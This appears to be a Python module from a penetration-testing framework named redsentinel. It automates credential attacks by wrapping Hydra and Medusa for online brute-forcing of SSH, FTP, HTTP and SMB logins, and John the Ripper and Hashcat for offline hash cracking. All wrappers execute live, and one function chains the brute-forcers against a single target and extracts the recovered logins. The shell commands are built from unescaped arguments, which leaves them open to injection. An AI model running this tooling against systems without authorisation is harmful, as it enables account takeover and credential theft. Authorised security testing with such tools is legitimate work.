# redsentinel/attacks/password_tools.py
from redsentinel.tools.external_tool import find_binary, run_command
import logging

logger = logging.getLogger(__name__)


def hydra_scan(target, protocol, username=None, password_list=None, port=None):
    """
    Run Hydra password brute force
    
    Args:
        target: Target host
        protocol: Protocol (ssh, ftp, http, smb, etc.)
        username: Username or wordlist
        password_list: Password wordlist
        port: Port number
    
    Returns:
        dict with scan results
    """
    binpath = find_binary("hydra")
    if not binpath:
        return {"error": "hydra not found. Install with: sudo apt install hydra"}
    
    cmd = f"{binpath}"
    
    if username:
        cmd += f" -l {username}"
    else:
        cmd += " -L /usr/share/wordlists/rockyou.txt"  # Default userlist
    
    if password_list:
        cmd += f" -P {password_list}"
    else:
        cmd += " -P /usr/share/wordlists/rockyou.txt"  # Default passlist
    
    if port:
        cmd += f" -s {port}"
    
    cmd += f" {target} {protocol} -o /tmp/hydra_output.txt -t 4"
    
    rc, out, err = run_command(cmd, timeout=600, dry_run=False)
    
    return {"rc": rc, "out": out, "err": err}


def medusa_scan(target, protocol, username=None, password_list=None, port=None):
    """
    Run Medusa password brute force
    
    Args:
        target: Target host
        protocol: Protocol (ssh, ftp, http, smb, etc.)
        username: Username or wordlist
        password_list: Password wordlist
        port: Port number
    
    Returns:
        dict with scan results
    """
    binpath = find_binary("medusa")
    if not binpath:
        return {"error": "medusa not found. Install with: sudo apt install medusa"}
    
    cmd = f"{binpath} -h {target}"
    
    if username:
        cmd += f" -U {username}"
    else:
        cmd += " -U /usr/share/wordlists/rockyou.txt"
    
    if password_list:
        cmd += f" -P {password_list}"
    else:
        cmd += " -P /usr/share/wordlists/rockyou.txt"
    
    if port:
        cmd += f" -n {port}"
    
    cmd += f" -M {protocol} -t 4 -O /tmp/medusa_output.txt"
    
    rc, out, err = run_command(cmd, timeout=600, dry_run=False)
    
    return {"rc": rc, "out": out, "err": err}


def john_hash_crack(hash_file, wordlist=None):
    """
    Crack hashes with John the Ripper
    
    Args:
        hash_file: File containing hashes
        wordlist: Optional wordlist
    
    Returns:
        dict with crack results
    """
    binpath = find_binary("john")
    if not binpath:
        return {"error": "john not found. Install with: sudo apt install john"}
    
    cmd = f"{binpath}"
    
    if wordlist:
        cmd += f" --wordlist={wordlist}"
    
    cmd += f" {hash_file}"
    
    rc, out, err = run_command(cmd, timeout=1800, dry_run=False)
    
    return {"rc": rc, "out": out, "err": err}


def hashcat_crack(hash_file, hash_type, wordlist=None):
    """
    Crack hashes with Hashcat
    
    Args:
        hash_file: File containing hashes
        hash_type: Hash type (0=MD5, 100=SHA1, etc.)
        wordlist: Optional wordlist
    
    Returns:
        dict with crack results
    """
    binpath = find_binary("hashcat")
    if not binpath:
        return {"error": "hashcat not found. Install: https://hashcat.net/hashcat/"}
    
    cmd = f"{binpath} -m {hash_type}"
    
    if wordlist:
        cmd += f" -a 0 {hash_file} {wordlist}"
    else:
        cmd += f" -a 0 {hash_file} /usr/share/wordlists/rockyou.txt"
    
    rc, out, err = run_command(cmd, timeout=1800, dry_run=False)
    
    return {"rc": rc, "out": out, "err": err}


def parse_hydra_results(output_file="/tmp/hydra_output.txt"):
    """Parse Hydra output"""
    import os
    if not os.path.exists(output_file):
        return []
    
    results = []
    try:
        with open(output_file, 'r') as f:
            lines = f.readlines()
            
        for line in lines:
            if "login:" in line.lower() and "password:" in line.lower():
                # Extract credentials
                results.append(line.strip())
                
    except Exception as e:
        logger.error(f"Error parsing Hydra output: {e}")
    
    return results


def comprehensive_password_attack(target, protocol, service_info=None):
    """
    Comprehensive password attack with multiple tools
    
    Args:
        target: Target host
        protocol: Protocol type
        service_info: Additional service information
    
    Returns:
        dict with attack results
    """
    results = {
        "target": target,
        "protocol": protocol,
        "hydra": None,
        "medusa": None
    }
    
    # Try Hydra first
    hydra_result = hydra_scan(target, protocol)
    if hydra_result.get("rc") == 0:
        results["hydra"] = parse_hydra_results()
    
    # Try Medusa as backup
    medusa_result = medusa_scan(target, protocol)
    if medusa_result.get("rc") == 0:
        results["medusa"] = medusa_result
    
    return results

